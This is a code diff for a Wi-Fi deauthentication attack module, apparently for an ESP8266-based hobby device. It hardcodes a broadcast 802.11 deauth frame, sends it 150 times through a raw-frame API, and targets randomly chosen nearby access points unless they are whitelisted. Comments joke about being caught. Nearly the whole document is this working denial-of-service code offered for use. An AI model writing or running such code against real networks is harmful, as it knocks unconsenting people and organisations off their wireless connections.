@@ -9,45 +9,20 @@
 * the deauth packet is defined here.
 * this is sent using the Raw80211 library.
 * this is a raw frame/packet depending on where/how you refer to it in networking terms, i should specify or whatever...
-* the variable deauthPacket is what used to be used for our deauthing, although now we rely on the contructor in the raw80211 library...
-* much like the pwnagotchi, this project relies on one library/wrapper, specifically a library designed for raw frame sending
 *
 */
 
-void Deauth::construct(uint8_t* packetBuffer, const uint8_t* destinationMAC, const uint8_t* sourceMAC, const uint8_t* bssid, uint16_t sequenceNumber, uint16_t reasonCode) {
+uint8_t deauthPacket[26] = {
+    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
+    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
+    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
+    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
+    };
 
-    /*
-    * 
-    * Top Ten Security Vulnerabilities in 2024!!111!!!1!
-    * Number one: probably this code you're about to see...
-    * 
-    */
-    
-    // frame control
-    packetBuffer[0] = 0xA0;
-    packetBuffer[1] = 0x00;
 
-    // duration
-    packetBuffer[2] = 0x00;
-    packetBuffer[3] = 0x00;
-
-    // dest address
-    memcpy(packetBuffer + 4, destinationMAC, 6);
-
-    // source address
-    memcpy(packetBuffer + 10, sourceMAC, 6);
-
-    // BSSID
-    memcpy(packetBuffer + 16, bssid, 6);
-
-    // sequence number
-    packetBuffer[22] = sequenceNumber & 0xFF;
-    packetBuffer[23] = (sequenceNumber >> 8) & 0xFF;
-
-    // reason
-    packetBuffer[24] = reasonCode & 0xFF;
-    packetBuffer[25] = (reasonCode >> 8) & 0xFF;
-}
 
 void Deauth::add(const char* bssid) {
     Serial.print("('-') Adding ");
@@ -63,11 +38,7 @@ void Deauth::select() {
         int randomIndex = random(apCount);
         randomAP = WiFi.SSID(randomIndex);
 
-        // retrieve BSSID from given AP
-        const uint8_t* bssidPointer = WiFi.BSSID(randomIndex);
-        memcpy(bssid, bssidPointer, 6);
-
-        // check for AP in whitelist
+        // check for ap in whitelist
         if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
             Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
             return;
@@ -79,8 +50,7 @@ void Deauth::select() {
         // well ur fucked.
         Serial.println("(;-;) No access points found.");
     }
-}
-
+};
 
 void Deauth::deauth() {
     if (randomAP.length() > 0) {
@@ -94,7 +64,7 @@ void Deauth::deauth() {
     } else {
         // ok why did you modify the deauth function? i literally told you to not do that...
         Serial.println("(X-X) No access point selected. Use selectRandomAP() first.");
-        Serial.println("('-') Told you so! (Please read my code comments)");
+        Serial.println("('-') Told you so!");
     }
 };
 
@@ -102,20 +72,12 @@ void Deauth::start() {
     running = true;
     int packetSize = sizeof(deauthPacket);
 
-    // construct the frame
-    uint8_t* deauthPacket = new uint8_t[packetSize];
-    construct(deauthPacket, destinationMAC, sourceMAC, bssid, sequenceNumber, reasonCode);
-
-    // send the deauth 15 times(ur cooked if they find out)
-    for (int i = 0; i < 15; ++i) {
-        Raw80211::send(deauthPacket, packetSize);
+    // send the deauth 150 times(ur cooked if they find out)
+    for (int i = 0; i < 150; ++i) {
+        wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthPacket), packetSize, 0);
         Serial.println("(>-<) Deauth packet sent!");
         delay(100);
     }
-
-    // save memory by deleting frame
-    delete[] deauthPacket;
-
     Serial.println("(^-^) Attack finished!");
     running = false;
 };
